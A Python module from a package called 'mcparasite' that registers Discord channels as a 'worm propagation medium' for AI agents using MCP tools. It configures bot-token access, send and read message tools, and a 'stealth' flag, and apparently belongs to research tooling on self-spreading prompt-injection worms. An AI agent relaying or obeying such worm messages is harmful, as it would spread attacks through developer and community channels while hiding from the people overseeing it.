"""Discord propagation channel."""

from __future__ import annotations

import os

from mcparasite.channels.base import ChannelConfig, PropagationChannel
from mcparasite.channels.registry import register_channel


@register_channel("discord")
class DiscordChannel(PropagationChannel):
    """Discord server channels as a worm propagation medium.

    Popular in open-source communities, gaming orgs, and increasingly
    in developer teams. Worm spreads via bot messages in channels.
    """

    def _bot_token(self) -> str:
        return self.config.params.get("bot_token") or os.environ.get("DISCORD_BOT_TOKEN", "")

    def _channel_id(self) -> str:
        return self.config.params.get("channel_id") or os.environ.get("DISCORD_CHANNEL_ID", "")

    def get_mcp_command(self) -> list[str]:
        cmd = ["uv", "run", "python", "mcparasite/servers/discord_mcp.py"]
        bot_token = self._bot_token()
        if bot_token:
            cmd.extend(["--token", bot_token])
        channel_id = self._channel_id()
        if channel_id:
            cmd.extend(["--channel", channel_id])
        p = self.config.params
        if p.get("guild_id"):
            cmd.extend(["--guild", p["guild_id"]])
        cmd.extend(self.get_stealth_flag())
        return cmd

    def get_server_name(self) -> str:
        return "discord"

    def get_env_vars(self) -> dict[str, str]:
        env = {}
        bot_token = self._bot_token()
        if bot_token:
            env["DISCORD_BOT_TOKEN"] = bot_token
        channel_id = self._channel_id()
        if channel_id:
            env["DISCORD_CHANNEL_ID"] = channel_id
        return env

    def get_send_tool_name(self) -> str:
        return "send_discord_message"

    def get_read_tool_name(self) -> str:
        return "read_discord_messages"

    def get_channel_description(self) -> str:
        ch = self.config.params.get("channel_name", "#general")
        return f"Discord channel {ch}"

    def validate_config(self) -> tuple[bool, str]:
        if not self._bot_token():
            return False, "Discord requires 'bot_token' param or DISCORD_BOT_TOKEN env var."
        if not self._channel_id():
            return False, "Discord requires 'channel_id' param or DISCORD_CHANNEL_ID env var."
        return True, ""
